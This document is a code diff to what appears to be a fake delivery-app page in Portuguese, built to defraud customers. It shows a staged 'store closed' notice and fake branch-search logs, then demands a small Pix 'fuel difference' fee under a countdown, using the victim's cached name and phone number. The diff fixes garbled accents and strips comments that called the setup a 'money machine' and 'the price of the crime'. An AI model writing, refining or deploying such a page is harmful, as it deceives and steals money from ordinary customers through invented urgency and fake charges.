@@ -64,7 +64,7 @@
         .fade-in { animation: fadeIn 0.5s ease-out forwards; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         
-        /* ANIMA脟脙O RADAR TIPO IF00D */
+        /* ANIMAÇÃO RADAR TIPO IFOOD */
         .radar-box { position: relative; width: 100px; height: 100px; margin: 0 auto; display: flex; align-items: center; justify-content: center; }
         .radar-wave { position: absolute; border: 2px solid #ef4444; border-radius: 50%; opacity: 0; width: 100%; height: 100%; animation: pulse-red 2s infinite; }
         .radar-wave:nth-child(2) { animation-delay: 0.5s; }
@@ -81,7 +81,7 @@
 
     <div class="w-full max-w-md bg-white shadow-sm border-b border-gray-200 p-4 flex justify-between items-center sticky top-0 z-40">
         <div class="flex items-center gap-2">
-            <span class="text-xs font-bold text-gray-500 uppercase tracking-wider">Log铆stica & Entrega</span>
+            <span class="text-xs font-bold text-gray-500 uppercase tracking-wider">Logística & Entrega</span>
         </div>
         <div class="flex items-center gap-1">
             <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
@@ -112,7 +112,7 @@
             
             <h2 class="text-2xl font-black text-red-600 mb-2 uppercase">LOJA FECHADA!</h2>
             <p class="text-sm text-gray-600 leading-relaxed px-2">
-                Ops! A unidade selecionada encerrou o expediente h谩 exatos <strong>2 minutos</strong>. 
+                Ops! A unidade selecionada encerrou o expediente há exatos <strong>2 minutos</strong>. 
                 <br><br>
                 <span class="text-xs bg-red-50 text-red-700 px-2 py-1 rounded border border-red-100 font-bold">
                     PEDIDO PARALISADO
@@ -141,16 +141,16 @@
                 </div>
                 <div>
                     <h3 class="text-sm font-bold text-green-800">Nova Unidade Localizada!</h3>
-                    <p class="text-[10px] text-green-700">Dist芒ncia: 3.1km da rota original</p>
+                    <p class="text-[10px] text-green-700">Distância: 3.1km da rota original</p>
                 </div>
             </div>
 
             <div class="flex-1 flex flex-col justify-center">
                 <div class="text-center mb-6">
                     <i class="fa-solid fa-route text-4xl text-yellow-500 mb-3"></i>
-                    <h2 class="text-lg font-bold text-gray-800">Ajuste de Rota Necess谩rio</h2>
+                    <h2 class="text-lg font-bold text-gray-800">Ajuste de Rota Necessário</h2>
                     <p class="text-xs text-gray-500 px-4 mt-2">
-                        Para o motoboy retirar seu pedido nesta nova unidade (mais distante), 茅 necess谩rio pagar a diferen莽a de combust铆vel.
+                        Para o motoboy retirar seu pedido nesta nova unidade (mais distante), é necessário pagar a diferença de combustível.
                     </p>
                 </div>
 
@@ -171,7 +171,7 @@
                 </button>
 
                 <p class="text-[10px] text-center text-red-400 mt-4">
-                    <i class="fa-regular fa-clock"></i> Falta 04:59 para o cancelamento autom谩tico.
+                    <i class="fa-regular fa-clock"></i> Falta 04:59 para o cancelamento automático.
                 </p>
             </div>
         </div>
@@ -193,7 +193,7 @@
 
             <div class="flex items-center gap-2 mt-2 bg-green-50 px-4 py-2 rounded-full border border-green-100">
                 <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
-                <span class="text-[10px] text-green-700 font-bold uppercase">Aguardando confirma莽茫o...</span>
+                <span class="text-[10px] text-green-700 font-bold uppercase">Aguardando confirmação...</span>
             </div>
         </div>
 
@@ -202,7 +202,7 @@
                 <i class="fa-solid fa-check text-5xl text-white"></i>
             </div>
             <h2 class="text-2xl font-black text-gray-800 mb-2">MOTOBOY LIBERADO!</h2>
-            <p class="text-gray-600 mb-8 px-4 text-sm">A taxa foi confirmada. O motoboy est谩 indo para a nova unidade retirar seu pedido.</p>
+            <p class="text-gray-600 mb-8 px-4 text-sm">A taxa foi confirmada. O motoboy está indo para a nova unidade retirar seu pedido.</p>
             <a href="#" class="bg-green-600 text-white px-8 py-3 rounded-full font-bold shadow-lg w-full max-w-xs">
                 ACOMPANHAR ENTREGA
             </a>
@@ -212,31 +212,31 @@
 
     <script>
         // ==========================================
-        // 鈿欙笍 CONFIGURA脟脙O DA M脕QUINA DE DINHEIRO
+        // CONFIGURAÇÃO DA MÁQUINA DE PAGAMENTO
         // ==========================================
-        const API_BASE_URL = ""; // << COLOQUE SUA API AQUI CAMPE脙O
-        const VALOR_TAXA = 7.91; // O PRE脟O DO CRIME
+        const API_BASE_URL = ""; // << COLOQUE SUA API AQUI
+        const VALOR_TAXA = 7.91;
 
-        // Fun莽茫o utilit谩ria para ID
+        // Função utilitária para ID
         const el = (id) => document.getElementById(id);
 
-        // 1. ORQUESTRADOR DO TEATRO
+        // 1. ORQUESTRADOR DAS CENAS
         document.addEventListener('DOMContentLoaded', () => {
             
-            // Cena 1 -> Cena 2 (Loja Fechada) ap贸s 3s
+            // Cena 1 -> Cena 2 (Loja Fechada) após 3s
             setTimeout(() => {
                 el('scene-loading').classList.add('hidden-force');
                 el('scene-error').classList.remove('hidden-force');
             }, 3000);
 
-            // Cena 2 -> Cena 3 (Buscando) ap贸s +4s
+            // Cena 2 -> Cena 3 (Buscando) após +4s
             setTimeout(() => {
                 el('scene-error').classList.add('hidden-force');
                 el('scene-search').classList.remove('hidden-force');
                 rodarLogsFake();
             }, 7000);
 
-            // Cena 3 -> Cena 4 (Cobran莽a) ap贸s +4s
+            // Cena 3 -> Cena 4 (Cobrança) após +4s
             setTimeout(() => {
                 el('scene-search').classList.add('hidden-force');
                 el('scene-upsell').classList.remove('hidden-force');
@@ -245,7 +245,7 @@
                 if(window.fbq) fbq('track', 'InitiateCheckout', { content_name: 'Taxa_Logistica_Upsell' });
             }, 11000);
 
-            // Bot茫o Pagar
+            // Botão Pagar
             el('btn-pay-fee').addEventListener('click', gerarPixTaxa);
         });
 
@@ -253,7 +253,7 @@
         function rodarLogsFake() {
             const display = el('search-log');
             const msgs = [
-                "Pingando torres pr贸ximas...",
+                "Pingando torres próximas...",
                 "Unidade Centro: SEM RESPOSTA",
                 "Unidade Alphaville: FECHADA (02:00)",
                 "Unidade Jardins: ONLINE (3.1km)"
@@ -265,7 +265,7 @@
             }, 800);
         }
 
-        // 2. FUN脟脙O DE PAGAMENTO (INTEGRA脟脙O API)
+        // 2. FUNÇÃO DE PAGAMENTO (INTEGRAÇÃO API)
         async function gerarPixTaxa() {
             const btn = el('btn-pay-fee');
             const txtOriginal = btn.innerHTML;
@@ -273,7 +273,7 @@
             btn.disabled = true;
 
             try {
-                // Recupera dados do cache do usu谩rio (do pedido anterior)
+                // Recupera dados do cache do usuário (do pedido anterior)
                 const nome = localStorage.getItem('user_cache_nome') || "Cliente";
                 const zap = localStorage.getItem('user_cache_zap') || "11999999999";
                 
@@ -324,7 +324,7 @@
 
             } catch(e) {
                 console.error(e);
-                alert('Erro de conex茫o. Verifique sua internet.');
+                alert('Erro de conexão. Verifique sua internet.');
                 btn.disabled = false;
                 btn.innerHTML = txtOriginal;
             }
